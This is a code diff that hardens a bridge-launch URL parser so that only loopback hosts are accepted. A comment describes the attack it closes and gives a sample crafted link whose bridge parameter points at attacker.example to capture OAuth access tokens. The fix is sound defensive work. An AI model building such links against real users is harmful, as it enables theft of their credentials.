@@ -19,6 +19,7 @@ import {
   BRIDGE_TOKEN_QUERY_PARAM,
   BRIDGE_WS_QUERY_PARAM,
   type BridgeRole,
+  isLoopbackHostname,
 } from '@slicc/shared-ts';
 
 export type { BridgeRole };
@@ -105,9 +106,10 @@ export function deriveBridgeLickWsUrl(bridgeWsUrl: string): string | null {
 
 /**
  * Extract bridge coordinates from a launch URL's query string. Returns
- * `null` unless BOTH `bridge` and `bridgeToken` are present and the URL
- * uses a `ws://` or `wss://` scheme — partial / malformed inputs degrade
- * to the legacy bundled-UI path (no bridge) rather than throwing.
+ * `null` unless BOTH `bridge` and `bridgeToken` are present, the URL uses a
+ * `ws://` or `wss://` scheme, and its host is loopback — partial / malformed
+ * inputs degrade to the legacy bundled-UI path (no bridge) rather than
+ * throwing.
  */
 export function parseBridgeLaunchParams(search: string): BridgeLaunchParams | null {
   let params: URLSearchParams;
@@ -121,6 +123,27 @@ export function parseBridgeLaunchParams(search: string): BridgeLaunchParams | nu
   const token = params.get(BRIDGE_TOKEN_QUERY_PARAM);
   if (!url || !token) return null;
   if (!/^wss?:\/\//.test(url)) return null;
+
+  // The bridge is by construction a LOCAL node-server / swift-server —
+  // `ws://localhost:<cdpPort>/cdp`, which is what every producer emits — and
+  // `apiBaseUrl` below is derived straight from this host. The query string
+  // that carries it, however, is attacker-suppliable: the page is served from
+  // the hosted origin, so a crafted link
+  // (`https://www.sliccy.ai/?bridge=wss://attacker.example/cdp&bridgeToken=x`)
+  // aims the whole local /api surface at a remote host, and a server that
+  // permits the request via CORS reads whatever is sent. That includes the
+  // boot-time OAuth replica push, which carries raw access tokens. Enforce the
+  // documented loopback contract here rather than at each consumer, so the SW
+  // registration, the /api base, the lick socket, and the CDP dial are all
+  // covered by one check. A non-loopback bridge is malformed, and degrades to
+  // the no-bridge path like any other malformed input.
+  let bridgeHostname: string;
+  try {
+    bridgeHostname = new URL(url).hostname;
+  } catch {
+    return null;
+  }
+  if (!isLoopbackHostname(bridgeHostname)) return null;
 
   const rawRole = params.get(BRIDGE_ROLE_QUERY_PARAM);
   const role: BridgeRole | null = rawRole === 'leader' || rawRole === 'follower' ? rawRole : null;
